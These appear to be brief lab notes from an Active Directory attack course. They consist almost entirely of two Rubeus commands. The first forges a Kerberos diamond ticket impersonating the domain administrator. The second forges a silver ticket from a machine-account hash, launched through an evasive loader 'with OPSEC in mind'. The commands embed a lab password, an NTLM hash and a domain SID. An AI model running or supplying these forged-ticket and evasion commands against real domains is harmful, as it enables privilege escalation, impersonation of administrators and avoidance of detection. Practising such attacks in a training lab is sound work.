Create a diamond ticket
```powershell
Rubeus.exe diamond /krbkey:<aeskey>/user:student548 /password:cAyF6wTLSydnL2M7 /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

**OPSEC IN MIND** create a silver ticket with the ntlm of a computer account
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:b8f18421f92b4ef069829b1dfd0e10e9 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```